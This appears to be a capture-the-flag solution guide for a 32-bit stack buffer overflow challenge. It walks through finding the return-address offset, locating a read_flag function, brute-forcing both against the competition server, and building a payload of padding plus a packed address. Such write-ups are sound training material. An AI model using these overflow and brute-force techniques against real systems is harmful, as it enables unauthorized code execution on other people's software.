# Echo Service - Solution Guide

## Challenge Setup

This is a classic **buffer overflow** challenge worth 500 points. The goal is to exploit a vulnerable function to execute a function that reads the flag.

## What I've Prepared

### 1. `exploit.py` - Main Exploitation Script
A Python script that can:
- Connect to the service and test it
- Send crafted payloads with configurable offset and return address
- Try common configurations automatically

### 2. `README.md` - Challenge Documentation
Comprehensive documentation about the challenge, vulnerability, and exploitation strategy.

### 3. `analyze_dump.py` - Binary Analysis Helper
Analyzes the binary dump to extract key information.

## How to Solve This Challenge

### Step 1: Get the Binary (if possible)
The provided dump shows symbols and strings, but to properly exploit, you ideally need the actual ELF binary:

```bash
# Try to download the binary
curl -O http://chals.uscc-cyberbowl-2025.ctf.institute/echo_service
# or
wget http://chals.uscc-cyberbowl-2025.ctf.institute/echo_service
```

### Step 2: Find the read_flag Address
If you have the binary:
```bash
objdump -d echo_service | grep -A 20 "read_flag"
# or
readelf -s echo_service | grep read_flag
# or use a tool like Ghidra or radare2
```

Look for the address where `read_flag` starts (e.g., `080486a7`).

### Step 3: Find the Buffer Overflow Offset
You need to determine how many bytes it takes to overwrite the return address.

**Method 1: Manual Testing**
```bash
# Test with increasing sizes
python3 exploit.py test
```

**Method 2: Pattern Analysis (if you have the binary)**
```bash
# Create a cyclic pattern
python3 -c "from pwn import *; print(cyclic(100))" > pattern.txt

# Send it to the service and see where it crashes
# Then use: cyclic_find(0xdeadbeef) to find the offset
```

Common offsets in CTF challenges: 32, 40, 44, 48, 52, 56, 60, 64

### Step 4: Craft and Send the Exploit
Once you have both values:
```bash
python3 exploit.py <offset> <read_flag_address>

# Example:
python3 exploit.py 40 0x080486a7
```

## Working Without the Binary

If you can't download the binary, you need to:

1. **Brute force the offset**: Try common values (32-64 bytes)
2. **Guess the read_flag address**: 
   - Typical addresses for small 32-bit binaries: `0x08048xxx`
   - Try addresses in the range: `0x08048500` - `0x08048800`
   - Increment by 16 (0x10) or use common alignment values

3. **Use the automated search**:
```bash
python3 exploit.py
```
This will try common configurations automatically.

## Expected Behavior

### Normal Interaction
```
---
ECHO SERVICE
---
> hello
hello
> 
```

### Successful Exploit
```
---
ECHO SERVICE
---
> [payload sent]
uscc{flag_content_here}
```

## Troubleshooting

### Connection Timeout
- The service might be offline or experiencing issues
- Try again later or contact the CTF organizers

### No Flag Received
- Wrong offset: Try different buffer sizes
- Wrong address: The read_flag function might be at a different address
- Payload format: Make sure you're sending the payload correctly

### Getting Closer
If you see different behavior (crash, different error message, etc.), you're making progress!
- Adjust the offset up or down
- Try nearby addresses (±16 bytes)

## Quick Reference

```bash
# Test connection
python3 exploit.py test

# Exploit with known values  
python3 exploit.py 40 0x080486a7

# Try automated search
python3 exploit.py

# Manual connection for testing
python3 -c "import socket; s=socket.socket(); s.connect(('chals.uscc-cyberbowl-2025.ctf.institute', 3014)); s.sendall(b'test\n'); print(s.recv(1024))"
```

## Additional Resources

- [Buffer Overflow Tutorial](https://www.exploit-db.com/docs/english/28475-linux-stack-based-buffer-overflows.pdf)
- [Return-to-libc Attacks](https://css.csail.mit.edu/6.858/2014/readings/return-to-libc.pdf)
- [Pwntools Documentation](https://docs.pwntools.com/)

## Notes

- This is a 32-bit ELF binary (use `p32()` for addresses)
- Little-endian architecture (x86)
- Return address is stored on the stack after the saved base pointer
- Standard exploit: `payload = b'A' * offset + p32(read_flag_addr) + b'\n'`

Good luck! 🚩
